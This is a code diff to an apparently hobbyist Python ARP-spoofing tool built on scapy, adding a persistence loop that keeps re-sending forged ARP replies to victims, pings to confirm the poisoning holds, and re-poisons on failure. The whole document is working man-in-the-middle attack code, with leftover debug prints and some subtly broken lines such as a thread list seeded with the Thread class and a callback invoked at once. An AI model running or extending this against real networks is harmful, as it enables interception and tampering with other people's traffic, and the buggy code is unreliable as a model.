@@ -1,5 +1,5 @@
-import scapy.layers.l2
-import scapy.layers.inet
+from scapy.layers.l2 import Ether, ARP
+from scapy.layers.inet import IP, ICMP
 from scapy.all import *
 from DataStructures import *
 from threading import Thread
@@ -16,7 +16,7 @@ class AttackTools:
         ether_index = 0
         arp_index = 1
 
-        arp = scapy.layers.l2.Ether() / scapy.layers.l2.ARP()
+        arp = Ether() / ARP()
         arp[ether_index].src = attacker.get_hwaddr()
         arp[arp_index].hwsrc = attacker.get_hwaddr()
         arp[arp_index].psrc = target1.get_addr()
@@ -50,6 +50,11 @@ class AttackTools:
             print("Poisoning targets...")
             thread1.join()
             thread2.join()
+            threads = [Thread]
+            for poisoner in poisoners:
+                thread = Thread(target=poisoner.persistence)
+                threads.append(thread)
+                thread.start()
             print()
             print("Poisoning succeeded")
 
@@ -66,29 +71,39 @@ class ARPPoisoner:
         self.ping_send_thread = Thread
         self.ping_listen_thread = Thread
         self.confirm_thread = Thread
+        self.persistence_thread = Thread
         self.killed = False
-        self.pkt = pkt
+        self.arp_pkt = pkt
+        self.ping_pkt = IP(dst=victim.get_addr(), src=host.get_addr())/ICMP()
         self.host = host
         self.victim = victim
         self.success = False
+        self.quick_confirm_bool = bool
+
+    def kill(self):
+        self.killed = True
+
+    def set_confirm_bool(self, confirm: bool):
+        self.quick_confirm_bool = confirm
+
+    def set_success(self, success: bool):
+        self.success = success
+
+    def get_thread(self):
+        return self.flood_thread
 
     def poison(self):
-        self.flood_thread = Thread(target=self.sendp_flood, args=(self.pkt,))
+        self.flood_thread = Thread(target=self.sendp_flood)
         self.flood_thread.start()
         self.confirm_thread = Thread(target=self.confirm_poison)
         self.confirm_thread.start()
         self.flood_thread.join()
         self.confirm_thread.join()
 
-    def kill(self):
-        self.killed = True
-
-    def get_thread(self):
-        return self.flood_thread
-
-    def sendp_flood(self, pkt):
+    def sendp_flood(self):
         while not self.killed:
-            sendp(pkt, verbose=False)
+            sendp(self.arp_pkt, verbose=False)
+            sleep(0.1)
 
     def confirm_poison(self):
         self.ping_listen_thread = Thread(target=self.listen_ping)
@@ -101,17 +116,41 @@ class ARPPoisoner:
 
     def listen_ping(self):
         filt = "icmp and dst host " + self.victim.get_addr()
+
         sniff(count=1, filter=filt)
-        print("Successfully poisoned " + self.victim.get_addr())
         self.success = True
+        print("Successfully poisoned " + self.victim.get_addr())
 
     def send_ping(self):
-        pkt = scapy.layers.inet.IP(dst=self.victim.get_addr(), src=self.host.get_addr())/scapy.layers.inet.ICMP()
         while not self.success:
-            send(pkt, verbose=False)
+            send(self.ping_pkt, verbose=False)
             sleep(1)
 
         self.kill()
+
+    def persistence(self):
+        while True:
+            print("test2")
+            sendp(self.arp_pkt, verbose=False)
+            self.quick_confirm()
+            if not self.success:
+                print("Poisoning at " + self.victim.get_addr() + " failed, re-poisoning")
+                self.poison()
+
+            sleep(5)
+
+    def quick_confirm(self):
+        filt = "icmp and dst host " + self.victim.get_addr()
+
+        print("testing " + self.victim.get_addr())
+
+        self.quick_confirm_bool = False
+
+        send(self.ping_pkt, verbose=False)
+
+        sniff(count=1, filter=filt, timeout=1, prn=self.set_confirm_bool(True))
+
+        self.success = self.quick_confirm_bool
 
 
 class Sniffer:
@@ -128,7 +167,7 @@ class Sniffer:
 
         # The sniff function will only terminate once it receives a packet, so send a meaningless packet to ensure it
         # terminates immediately.
-        pkt = scapy.layers.inet.IP(dst=self.interface.get_active_hosts()[0].get_addr())
+        pkt = IP(dst=self.interface.get_active_hosts()[0].get_addr())
         send(pkt, iface=self.interface.get_name(), verbose=False)
 
     def is_killed(self):
